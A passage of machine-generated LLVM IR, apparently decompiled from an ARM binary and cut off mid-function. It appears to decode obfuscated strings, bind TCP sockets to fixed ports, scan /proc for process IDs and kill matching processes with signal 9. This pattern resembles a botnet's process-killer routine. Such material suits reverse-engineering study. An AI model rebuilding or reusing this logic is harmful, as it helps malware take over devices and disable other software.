  %stack_var_-224 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-4328 = alloca i32, align 4
  %v3_ced0 = load i32, i32* @r4, align 4
  %v6_ced0 = load i32, i32* @r5, align 4
  %v9_ced0 = load i32, i32* @r6, align 4
  %v12_ced0 = load i32, i32* @r7, align 4
  %v15_ced0 = load i32, i32* @r8, align 4
  %v18_ced0 = load i32, i32* @sb, align 4
  %v21_ced0 = load i32, i32* @sl, align 4
  %v24_ced0 = load i32, i32* @fp, align 4
  %v27_ced0 = load i32, i32* @lr, align 4
  %v2_cee0 = call i32 @function_10860(i32* null)
  store i32 %v2_cee0, i32* @r0, align 4
  store i32 %v2_cee0, i32* @r7, align 4
  %v0_cee8 = call i32 @function_108d0()
  %v7_ceec = icmp eq i32 %v0_cee8, -1
  %. = zext i1 %v7_ceec to i32
  %tmp136 = icmp slt i32 %v0_cee8, 1
  %storemerge96 = select i1 %tmp136, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20788.59 to i32), i32* %r3.global-to-local, align 4
  %v2_cf08 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cee8, i32* @global_var_20788.59, align 4
  br i1 %v2_cf08, label %dec_label_pc_cf24, label %dec_label_pc_cf14

dec_label_pc_cf14:                                ; preds = %dec_label_pc_d040, %dec_label_pc_cf24, %dec_label_pc_ced0
  %v1_cf20 = phi i32 [ %v2_cfdc, %dec_label_pc_cf24 ], [ %v0_cee8, %dec_label_pc_ced0 ], [ 0, %dec_label_pc_d040 ]
  store i32 %v3_ced0, i32* @r4, align 4
  store i32 %v6_ced0, i32* @r5, align 4
  store i32 %v9_ced0, i32* @r6, align 4
  store i32 %v12_ced0, i32* @r7, align 4
  store i32 %v15_ced0, i32* @r8, align 4
  store i32 %v18_ced0, i32* @sb, align 4
  store i32 %v21_ced0, i32* @sl, align 4
  store i32 %v24_ced0, i32* @fp, align 4
  store i32 %v27_ced0, i32* @lr, align 4
  ret i32 %v1_cf20

dec_label_pc_cf24:                                ; preds = %dec_label_pc_ced0
  %v1_cf28 = call i32 @function_12cc8(i32 5)
  %v1_cf30 = call i32 @function_11604(i32 4096)
  store i32 ptrtoint (i32* @global_var_1e6fc.61 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20784.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_cf30, i32* %r2.global-to-local, align 4
  %v0_cf40 = load i32, i32* @r5, align 4
  %v1_cf40 = trunc i32 %v0_cf40 to i8
  %v3_cf40 = inttoptr i32 %v1_cf30 to i8*
  store i8 %v1_cf40, i8* %v3_cf40, align 1
  %v0_cf48 = load i32, i32* @r5, align 4
  %v1_cf48 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf48 = inttoptr i32 %v1_cf48 to i32*
  store i32 %v0_cf48, i32* %v2_cf48, align 4
  %v0_cf4c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf4c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf4c = inttoptr i32 %v1_cf4c to i32*
  store i32 %v0_cf4c, i32* %v2_cf4c, align 4
  %v1_cf50 = call i32 @function_fd40(i32 13)
  %v1_cf58 = call i32 @function_fd40(i32 14)
  %v2_cf60 = ptrtoint i32* %stack_var_-4328 to i32
  store i32 %v2_cf60, i32* %r2.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r5, align 4
  store i32 %v0_cf64, i32* %r1.global-to-local, align 4
  %v2_cf70 = inttoptr i32 %v0_cf64 to i32*
  %v3_cf70 = call i32 @function_fc7c(i32 13, i32* %v2_cf70)
  %v1_cf78 = add i32 %v2_cf60, -56
  store i32 %v1_cf78, i32* %r3.global-to-local, align 4
  store i32 %v3_cf70, i32* %r1.global-to-local, align 4
  store i32 %v1_cf78, i32* @r0, align 4
  %v2_cf88 = inttoptr i32 %v1_cf78 to i8*
  %v3_cf88 = call i32 @function_10148(i8* %v2_cf88, i32 %v3_cf70)
  store i32 %v3_cf88, i32* @r0, align 4
  %v2_cf90 = add i32 %v3_cf88, %v1_cf78
  store i32 %v2_cf90, i32* @r4, align 4
  %v0_cf94 = call i32 @function_1084c()
  %v2_cf9c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_cf9c, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfa4 = trunc i32 %v0_cf94 to i8
  %v4_cfa4 = call i32 @function_10580(i8 %v3_cfa4, i32 10, i32 %v2_cf9c)
  store i32 %v4_cfa4, i32* %r1.global-to-local, align 4
  %v0_cfac = load i32, i32* @r4, align 4
  store i32 %v0_cfac, i32* @r0, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfac to i8*
  %v3_cfb0 = call i32 @function_10148(i8* %v2_cfb0, i32 %v4_cfa4)
  %v0_cfb4 = load i32, i32* @r5, align 4
  store i32 %v0_cfb4, i32* %r1.global-to-local, align 4
  %v1_cfb8 = load i32, i32* @r4, align 4
  %v2_cfb8 = add i32 %v1_cfb8, %v3_cfb0
  store i32 %v2_cfb8, i32* @r4, align 4
  %v2_cfc0 = inttoptr i32 %v0_cfb4 to i32*
  %v3_cfc0 = call i32 @function_fc7c(i32 14, i32* %v2_cfc0)
  store i32 %v3_cfc0, i32* %r1.global-to-local, align 4
  %v0_cfc8 = load i32, i32* @r4, align 4
  store i32 %v0_cfc8, i32* @r0, align 4
  %v2_cfcc = inttoptr i32 %v0_cfc8 to i8*
  %v3_cfcc = call i32 @function_10148(i8* %v2_cfcc, i32 %v3_cfc0)
  %v0_cfd0 = load i32, i32* @r5, align 4
  store i32 %v0_cfd0, i32* %r1.global-to-local, align 4
  store i32 %v3_cfcc, i32* @r6, align 4
  %v2_cfdc = call i32 @function_107ec(i32 %v1_cf78, i32 %v0_cfd0)
  %v7_cfe0 = icmp eq i32 %v2_cfdc, -1
  br i1 %v7_cfe0, label %dec_label_pc_cf14, label %dec_label_pc_cfe8

dec_label_pc_cfe8:                                ; preds = %dec_label_pc_cf24
  %v1_cfe8 = call i32 @function_10be0(i32 %v2_cfdc)
  %v1_cff0 = call i32 @function_fca0(i32 13)
  %v1_cff8 = call i32 @function_fca0(i32 14)
  store i32 ptrtoint (i32* @global_var_20784.63 to i32), i32* @lr, align 4
  %v2_d004 = load i32, i32* @global_var_20784.63, align 4
  store i32 %v2_d004, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d010 = call i32 @function_10944(i32 %v1_cf78, i32 %v2_d004, i32 4095)
  %v7_d014 = icmp eq i32 %v3_d010, -1
  br i1 %v7_d014, label %.thread9, label %bb139

bb139:                                            ; preds = %dec_label_pc_cfe8
  store i32 ptrtoint (i32* @global_var_20784.63 to i32), i32* %r1.global-to-local, align 4
  %v3_d01c = load i32, i32* @global_var_20784.63, align 4
  store i32 %v3_d01c, i32* %r3.global-to-local, align 4
  %v1_d020 = load i32, i32* @r5, align 4
  %v2_d020 = trunc i32 %v1_d020 to i8
  %v5_d020 = add i32 %v3_d01c, %v3_d010
  %v6_d020 = inttoptr i32 %v5_d020 to i8*
  store i8 %v2_d020, i8* %v6_d020, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_cfe8, %bb139
  store i32 %v1_cf78, i32* %r2.global-to-local, align 4
  %v0_d028 = load i32, i32* @r6, align 4
  %v1_d028 = load i32, i32* @r4, align 4
  %v1_cf78.neg = sub i32 56, %v2_cf60
  %v2_d028 = add i32 %v1_cf78.neg, %v0_d028
  %v2_d02c = add i32 %v2_d028, %v1_d028
  store i32 %v2_d02c, i32* @r1, align 4
  store i32 %v1_cf78, i32* @r0, align 4
  %v0_d034 = call i32 @function_101b4()
  %v0_d038 = load i32, i32* @r5, align 4
  store i32 400, i32* @sl, align 4
  %v2_d0d0 = ptrtoint i32* %stack_var_-304 to i32
  %v2_d340 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d34c = bitcast i32* %stack_var_-224 to i8*
  %v2_d390 = ptrtoint i32* %stack_var_-288 to i32
  %v2_d394 = bitcast i32* %stack_var_-288 to i8*
  %v2_d4e0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d4ec = ptrtoint i32* %stack_var_-48 to i32
  %v2_d504 = ptrtoint i32* %stack_var_-8480 to i32
  %v2_d250 = ptrtoint i32* %stack_var_-144 to i32
  %v2_d218 = ptrtoint i32* %stack_var_-128 to i32
  %v2_d1e0 = ptrtoint i32* %stack_var_-112 to i32
  %v2_d1ac = ptrtoint i32* %stack_var_-96 to i32
  %v2_d174 = ptrtoint i32* %stack_var_-80 to i32
  %v2_d12c = ptrtoint i32* %stack_var_-64 to i32
  br label %dec_label_pc_d040

dec_label_pc_d040:                                ; preds = %dec_label_pc_d308, %.thread9
  %stack_var_-8484.0 = phi i32 [ %v0_d038, %.thread9 ], [ %stack_var_-8484.3, %dec_label_pc_d308 ]
  %v1_d044 = call i32 @function_fd40(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d050 = call i32 @function_fc7c(i32 13, i32* null)
  %v1_d054 = call i32 @function_10ddc(i32 %v3_d050)
  store i32 %v1_d054, i32* @fp, align 4
  %v2_d058 = icmp eq i32 %v1_d054, 0
  br i1 %v2_d058, label %dec_label_pc_cf14, label %dec_label_pc_d060

dec_label_pc_d060:                                ; preds = %dec_label_pc_d040
  %v1_d064 = call i32 @function_fca0(i32 13)
  %v1_d070 = call i32 @function_c93c(i32 58811)
  %v1_d07c = call i32 @function_c93c(i32 50951)
  %v1_d088 = call i32 @function_c93c(i32 14853)
  %v1_d090 = call i32 @function_c93c(i32 20480)
  %v1_d09c = call i32 @function_c93c(i32 47873)
  %v1_d0a8 = call i32 @function_c93c(i32 57616)
  %v1_d0b4 = call i32 @function_c93c(i32 2842)
  %v1_d0c0 = call i32 @function_c93c(i32 10522)
  %v1_d0c8 = call i32 @function_c93c(i32 5632)
  store i32 %v2_d0d0, i32* @lr, align 4
  store i32 20480, i32* %r3.global-to-local, align 4
  store i32 24465, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d118 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  %v7_d11c = icmp eq i32 %v3_d118, -1
  store i32 %v3_d118, i32* @r4, align 4
  br i1 %v7_d11c, label %dec_label_pc_d144, label %dec_label_pc_d128

dec_label_pc_d128:                                ; preds = %dec_label_pc_d060
  store i32 %v2_d12c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d134 = call i32 @function_1116c(i32 %v3_d118, i32 %v2_d12c, i32 16)
  %v0_d138 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d140 = call i32 @function_11258(i32 %v0_d138, i32 1)
  br label %dec_label_pc_d144

dec_label_pc_d144:                                ; preds = %dec_label_pc_d060, %dec_label_pc_d128
  %v1_d148 = call i32 @function_c93c(i32 5888)
  %v2_d14c = icmp eq i32 %v1_d148, 0
  br i1 %v2_d14c, label %dec_label_pc_d60c, label %dec_label_pc_d154

dec_label_pc_d154:                                ; preds = %dec_label_pc_d630, %dec_label_pc_d620, %dec_label_pc_d60c, %dec_label_pc_d144, %dec_label_pc_d644
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d160 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  %v7_d164 = icmp eq i32 %v3_d160, -1
  store i32 %v3_d160, i32* %r4.global-to-local, align 4
  br i1 %v7_d164, label %dec_label_pc_d18c, label %dec_label_pc_d170

dec_label_pc_d170:                                ; preds = %dec_label_pc_d154
  store i32 %v2_d174, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d17c = call i32 @function_1116c(i32 %v3_d160, i32 %v2_d174, i32 16)
  %v0_d180 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d188 = call i32 @function_11258(i32 %v0_d180, i32 1)
  br label %dec_label_pc_d18c

dec_label_pc_d18c:                                ; preds = %dec_label_pc_d154, %dec_label_pc_d170
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d198 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  %v7_d19c = icmp eq i32 %v3_d198, -1
  store i32 %v3_d198, i32* %r4.global-to-local, align 4
  br i1 %v7_d19c, label %dec_label_pc_d1c4, label %dec_label_pc_d1a8

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d18c
  store i32 %v2_d1ac, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1b4 = call i32 @function_1116c(i32 %v3_d198, i32 %v2_d1ac, i32 16)
  %v0_d1b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1c0 = call i32 @function_11258(i32 %v0_d1b8, i32 1)
  br label %dec_label_pc_d1c4

dec_label_pc_d1c4:                                ; preds = %dec_label_pc_d18c, %dec_label_pc_d1a8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1d0 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  %v7_d1d4 = icmp eq i32 %v3_d1d0, -1
  store i32 %v3_d1d0, i32* %r4.global-to-local, align 4
  br i1 %v7_d1d4, label %dec_label_pc_d1f8, label %dec_label_pc_d1e0

dec_label_pc_d1e0:                                ; preds = %dec_label_pc_d1c4
  store i32 %v2_d1e0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1e8 = call i32 @function_1116c(i32 %v3_d1d0, i32 %v2_d1e0, i32 16)
  %v0_d1ec = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1f4 = call i32 @function_11258(i32 %v0_d1ec, i32 1)
  br label %dec_label_pc_d1f8

dec_label_pc_d1f8:                                ; preds = %dec_label_pc_d1c4, %dec_label_pc_d1e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d204 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  %v7_d208 = icmp eq i32 %v3_d204, -1
  store i32 %v3_d204, i32* %r4.global-to-local, align 4
  br i1 %v7_d208, label %dec_label_pc_d230, label %dec_label_pc_d214

dec_label_pc_d214:                                ; preds = %dec_label_pc_d1f8
  store i32 %v2_d218, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d220 = call i32 @function_1116c(i32 %v3_d204, i32 %v2_d218, i32 16)
  %v0_d224 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d22c = call i32 @function_11258(i32 %v0_d224, i32 1)
  br label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d1f8, %dec_label_pc_d214
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d23c = call i32 @function_113bc(i32 2, i32 1, i32 0)
  %v7_d240 = icmp eq i32 %v3_d23c, -1
  store i32 %v3_d23c, i32* @r4, align 4
  br i1 %v7_d240, label %dec_label_pc_d268.preheader, label %dec_label_pc_d24c

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d230
  store i32 %v2_d250, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d258 = call i32 @function_1116c(i32 %v3_d23c, i32 %v2_d250, i32 16)
  %v0_d25c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d264 = call i32 @function_11258(i32 %v0_d25c, i32 1)
  br label %dec_label_pc_d268.preheader

dec_label_pc_d268.preheader:                      ; preds = %dec_label_pc_d24c, %dec_label_pc_d230
  %v0_d26860 = load i32, i32* @fp, align 4
  %v1_d26c61 = inttoptr i32 %v0_d26860 to i32*
  %v2_d26c62 = call i32 @function_10f20(i32* %v1_d26c61)
  %v2_d27064 = icmp eq i32 %v2_d26c62, 0
  br i1 %v2_d27064, label %dec_label_pc_d308, label %dec_label_pc_d278.preheader

dec_label_pc_d278.preheader:                      ; preds = %dec_label_pc_d268.preheader, %dec_label_pc_d268.backedge
  %v0_d27872 = phi i32 [ %v2_d26c, %dec_label_pc_d268.backedge ], [ %v2_d26c62, %dec_label_pc_d268.preheader ]
  %stack_var_-8484.165 = phi i32 [ %stack_var_-8484.1.be, %dec_label_pc_d268.backedge ], [ %stack_var_-8484.0, %dec_label_pc_d268.preheader ]
  br label %dec_label_pc_d278

dec_label_pc_d278:                                ; preds = %dec_label_pc_d278.preheader, %dec_label_pc_d2f0
  %v0_d288 = phi i32 [ %v2_d2fc, %dec_label_pc_d2f0 ], [ %v0_d27872, %dec_label_pc_d278.preheader ]
  %stack_var_-8484.2 = phi i32 [ %v1_d29c, %dec_label_pc_d2f0 ], [ %stack_var_-8484.165, %dec_label_pc_d278.preheader ]
  %v1_d278 = add i32 %v0_d288, 11
  %v2_d278 = inttoptr i32 %v1_d278 to i8*
  %v3_d278 = load i8, i8* %v2_d278, align 1
  %v4_d278 = zext i8 %v3_d278 to i32
  %v1_d27c = add nsw i32 %v4_d278, -48
  store i32 %v1_d27c, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d27c, 9
  br i1 %tmp, label %dec_label_pc_d268.backedge, label %dec_label_pc_d288

dec_label_pc_d288:                                ; preds = %dec_label_pc_d278
  store i32 %v1_d278, i32* @r6, align 4
  store i32 %v1_d278, i32* @r0, align 4
  %v1_d290 = call i32 @function_12a14(i32 %v1_d278)
  %v0_d298 = load i32, i32* @sl, align 4
  %v1_d29c = add i32 %stack_var_-8484.2, 1
  store i32 %v1_d290, i32* @r8, align 4
  %v5_d2a8 = icmp slt i32 %v0_d298, %v1_d290
  %v2_d318 = call i32 @function_10860(i32* null)
  br i1 %v5_d2a8, label %dec_label_pc_d314, label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d288
  %v0_d2b4 = load i32, i32* @r7, align 4
  %v2_d2b4 = sub i32 %v2_d318, %v0_d2b4
  %v7_d2bc = icmp slt i32 %v2_d2b4, 601
  br i1 %v7_d2bc, label %dec_label_pc_d2c4, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2ac
  store i32 400, i32* @sl, align 4
  br label %dec_label_pc_d268.backedge

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2ac
  %v0_d2c4 = load i32, i32* @r8, align 4
  %v7_d2c8 = icmp slt i32 %v0_d2c4, 401
  br i1 %v7_d2c8, label %dec_label_pc_d268.backedge, label %dec_label_pc_d2cc

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d2c4
  store i32 %v1_d29c, i32* @lr, align 4
  %v3_d2d4 = zext i32 %v1_d29c to i64
  %v4_d2d4 = mul nuw i64 %v3_d2d4, 3435973837
  %v3_d2d81 = udiv i64 %v4_d2d4, 34359738368
  %v3_d2dc3 = mul nuw nsw i64 %v3_d2d81, 8
  %v3_d2dc = trunc i64 %v3_d2dc3 to i32
  store i32 %v3_d2dc, i32* %r3.global-to-local, align 4
  %v2_d2e05 = mul nuw nsw i64 %v3_d2d81, 2
  %v2_d2e0 = trunc i64 %v2_d2e05 to i32
  %v2_d2e4 = add i32 %v3_d2dc, %v2_d2e0
  store i32 %v2_d2e4, i32* %r2.global-to-local, align 4
  %v9_d2e8 = icmp eq i32 %v1_d29c, %v2_d2e4
  br i1 %v9_d2e8, label %dec_label_pc_d2f0, label %dec_label_pc_d268.backedge

dec_label_pc_d2f0:                                ; preds = %dec_label_pc_d2cc
  %v1_d2f4 = call i32 @function_12cc8(i32 1)
  %v0_d2f8 = load i32, i32* @fp, align 4
  %v1_d2fc = inttoptr i32 %v0_d2f8 to i32*
  %v2_d2fc = call i32 @function_10f20(i32* %v1_d2fc)
  %v2_d300 = icmp eq i32 %v2_d2fc, 0
  br i1 %v2_d300, label %dec_label_pc_d308, label %dec_label_pc_d278

dec_label_pc_d308:                                ; preds = %dec_label_pc_d268.backedge, %dec_label_pc_d2f0, %dec_label_pc_d268.preheader
  %stack_var_-8484.3 = phi i32 [ %stack_var_-8484.0, %dec_label_pc_d268.preheader ], [ %v1_d29c, %dec_label_pc_d2f0 ], [ %stack_var_-8484.1.be, %dec_label_pc_d268.backedge ]
  %v0_d308 = load i32, i32* @fp, align 4
  %v1_d30c = inttoptr i32 %v0_d308 to i32*
  %v2_d30c = call i32 @function_10c14(i32* %v1_d30c)
  br label %dec_label_pc_d040

dec_label_pc_d314:                                ; preds = %dec_label_pc_d288
  %v1_d324 = call i32 @function_fd40(i32 13)
  %v1_d32c = call i32 @function_fd40(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d338 = call i32 @function_fc7c(i32 13, i32* null)
  store i32 %v2_d340, i32* @sb, align 4
  store i32 %v3_d338, i32* %r1.global-to-local, align 4
  store i32 %v2_d340, i32* @r0, align 4
  %v3_d34c = call i32 @function_10148(i8* %v2_d34c, i32 %v3_d338)
  %v1_d350 = load i32, i32* @sb, align 4
  %v2_d350 = add i32 %v1_d350, %v3_d34c
  store i32 %v2_d350, i32* %r5.global-to-local, align 4
  %v0_d354 = load i32, i32* @r6, align 4
  store i32 %v0_d354, i32* %r1.global-to-local, align 4
  store i32 %v2_d350, i32* @r0, align 4
  %v2_d35c = inttoptr i32 %v2_d350 to i8*
  %v3_d35c = call i32 @function_10148(i8* %v2_d35c, i32 %v0_d354)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d35c, i32* %r4.global-to-local, align 4
  %v3_d36c = call i32 @function_fc7c(i32 14, i32* null)
  store i32 %v3_d36c, i32* %r1.global-to-local, align 4
  %v1_d374 = load i32, i32* %r5.global-to-local, align 4
  %v2_d374 = add i32 %v1_d374, %v3_d35c
  store i32 %v2_d374, i32* @r0, align 4
  %v2_d378 = inttoptr i32 %v2_d374 to i8*
  %v3_d378 = call i32 @function_10148(i8* %v2_d378, i32 %v3_d36c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d384 = call i32 @function_fc7c(i32 13, i32* null)
  store i32 %v3_d384, i32* %r1.global-to-local, align 4
  store i32 %v2_d390, i32* @r0, align 4
  %v3_d394 = call i32 @function_10148(i8* %v2_d394, i32 %v3_d384)
  %v2_d3a0 = add i32 %v3_d394, %v2_d390
  store i32 %v2_d3a0, i32* @r5, align 4
  store i32 %v2_d3a0, i32* @r0, align 4
  %v0_d3a8 = load i32, i32* @r6, align 4
  store i32 %v0_d3a8, i32* %r1.global-to-local, align 4
  %v2_d3ac = inttoptr i32 %v2_d3a0 to i8*
  %v3_d3ac = call i32 @function_10148(i8* %v2_d3ac, i32 %v0_d3a8)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3ac, i32* @r4, align 4
  %v3_d3bc = call i32 @function_fc7c(i32 29, i32* null)
  store i32 %v3_d3bc, i32* %r1.global-to-local, align 4
  %v0_d3c4 = load i32, i32* @r4, align 4
  %v1_d3c4 = load i32, i32* @r5, align 4
  %v2_d3c4 = add i32 %v1_d3c4, %v0_d3c4
  store i32 %v2_d3c4, i32* @r0, align 4
  %v2_d3c8 = inttoptr i32 %v2_d3c4 to i8*
  %v3_d3c8 = call i32 @function_10148(i8* %v2_d3c8, i32 %v3_d3bc)
  %v1_d3d0 = call i32 @function_fca0(i32 13)
  %v1_d3d8 = call i32 @function_fca0(i32 14)
  store i32 %v1_cf78, i32* %r1.global-to-local, align 4
  store i32 4095, i32* @r2, align 4
  %v3_d3ec = call i32 @function_10944(i32 %v2_d340, i32 %v1_cf78, i32 4095)
  %v7_d3f0 = icmp eq i32 %v3_d3ec, -1
  store i32 %v3_d3ec, i32* @r5, align 4
  br i1 %v7_d3f0, label %dec_label_pc_d4b4, label %dec_label_pc_d3fc

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d314
  store i32 %v1_cf78, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d404 = add i32 %v3_d3ec, %v1_cf78
  %v5_d404 = inttoptr i32 %v4_d404 to i8*
  store i8 0, i8* %v5_d404, align 1
  %v1_d40c = call i32 @function_fd40(i32 30)
  %v0_d410 = load i32, i32* @r4, align 4
  store i32 %v0_d410, i32* %r1.global-to-local, align 4
  %v2_d418 = inttoptr i32 %v0_d410 to i32*
  %v3_d418 = call i32 @function_fc7c(i32 30, i32* %v2_d418)
  %v0_d41c = load i32, i32* @r5, align 4
  %v1_d41c = add i32 %v0_d41c, -1
  store i32 %v1_d41c, i32* @r1, align 4
  store i32 %v3_d418, i32* %r2.global-to-local, align 4
  %v4_d428 = call i32 @function_10470(i8* %v2_cf88, i32 %v1_d41c, i32 %v3_d418)
  %v7_d42c = icmp eq i32 %v4_d428, -1
  br i1 %v7_d42c, label %dec_label_pc_d448, label %dec_label_pc_d434

dec_label_pc_d434:                                ; preds = %dec_label_pc_d3fc
  %v1_d438 = call i32 @function_107b8(i32 %v1_cf78)
  %v0_d43c = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d444 = call i32 @function_109ac(i32 %v0_d43c, i32 9)
  br label %dec_label_pc_d448

dec_label_pc_d448:                                ; preds = %dec_label_pc_d3fc, %dec_label_pc_d434
  %v1_d44c = call i32 @function_fca0(i32 30)
  store i32 %v1_d44c, i32* @r0, align 4
  %v0_d450 = call i32 @function_1084c()
  store i32 %v0_d450, i32* @r0, align 4
  %v1_d454 = load i32, i32* @r8, align 4
  %v9_d454 = icmp eq i32 %v0_d450, %v1_d454
  br i1 %v9_d454, label %dec_label_pc_d480, label %dec_label_pc_d45c

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d448
  %v0_d45c = call i32 @function_107a4()
  %v1_d460 = load i32, i32* @r8, align 4
  %v9_d460 = icmp eq i32 %v0_d45c, %v1_d460
  br i1 %v9_d460, label %dec_label_pc_d480, label %dec_label_pc_d468

dec_label_pc_d468:                                ; preds = %dec_label_pc_d45c
  store i32 ptrtoint (i32* @global_var_20784.63 to i32), i32* %r3.global-to-local, align 4
  %v2_d470 = load i32, i32* @global_var_20784.63, align 4
  store i32 %v2_d470, i32* %r1.global-to-local, align 4
  %v3_d474 = call i32 @function_10500(i8* %v2_cf88, i32 %v2_d470)
  %v2_d478 = icmp eq i32 %v3_d474, 0
  br i1 %v2_d478, label %dec_label_pc_d48c, label %dec_label_pc_d468.dec_label_pc_d480_crit_edge

dec_label_pc_d468.dec_label_pc_d480_crit_edge:    ; preds = %dec_label_pc_d468
  %v0_d484.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d468.dec_label_pc_d480_crit_edge, %dec_label_pc_d45c, %dec_label_pc_d448
  %v0_d484 = phi i32 [ %v0_d484.pre, %dec_label_pc_d468.dec_label_pc_d480_crit_edge ], [ %v0_d45c, %dec_label_pc_d45c ], [ %v0_d450, %dec_label_pc_d448 ]
  store i32 %v2_d318, i32* @r7, align 4
  store i32 %v0_d484, i32* @sl, align 4
  br label %dec_label_pc_d268.backedge

dec_label_pc_d268.backedge:                       ; preds = %dec_label_pc_d2cc, %dec_label_pc_d2c4, %dec_label_pc_d278, %dec_label_pc_d480, %dec_label_pc_d5dc, %.thread10
  %stack_var_-8484.1.be = phi i32 [ %v1_d29c, %dec_label_pc_d5dc ], [ %v1_d29c, %dec_label_pc_d480 ], [ %v1_d29c, %.thread10 ], [ %stack_var_-8484.2, %dec_label_pc_d278 ], [ %v1_d29c, %dec_label_pc_d2c4 ], [ %v1_d29c, %dec_label_pc_d2cc ]
  %v0_d268 = load i32, i32* @fp, align 4
  %v1_d26c = inttoptr i32 %v0_d268 to i32*
  %v2_d26c = call i32 @function_10f20(i32* %v1_d26c)
  %v2_d270 = icmp eq i32 %v2_d26c, 0
  br i1 %v2_d270, label %dec_label_pc_d308, label %dec_label_pc_d278.preheader

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d468
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d494 = call i32 @function_107ec(i32 %v1_cf78, i32 0)
  %v7_d498 = icmp eq i32 %v2_d494, -1
  store i32 %v2_d494, i32* @r4, align 4
  br i1 %v7_d498, label %bb140, label %.thread12

bb140:                                            ; preds = %dec_label_pc_d48c
  store i32 9, i32* %r1.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d48c, %bb140
  store i32 ptrtoint (i32* @global_var_d4ac.66 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d498, i32 ptrtoint (i32* @global_var_109ac.65 to i32))
  %v0_d4ac = load i32, i32* @r4, align 4
  %v1_d4b0 = call i32 @function_10be0(i32 %v0_d4ac)
  br label %dec_label_pc_d4b4

dec_label_pc_d4b4:                                ; preds = %dec_label_pc_d314, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4bc = call i32 @function_107ec(i32 %v2_d340, i32 0)
  %v7_d4c0 = icmp eq i32 %v2_d4bc, -1
  store i32 %v2_d4bc, i32* %sl.global-to-local, align 4
  br i1 %v7_d4c0, label %dec_label_pc_d5dc, label %dec_label_pc_d4cc

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4b4
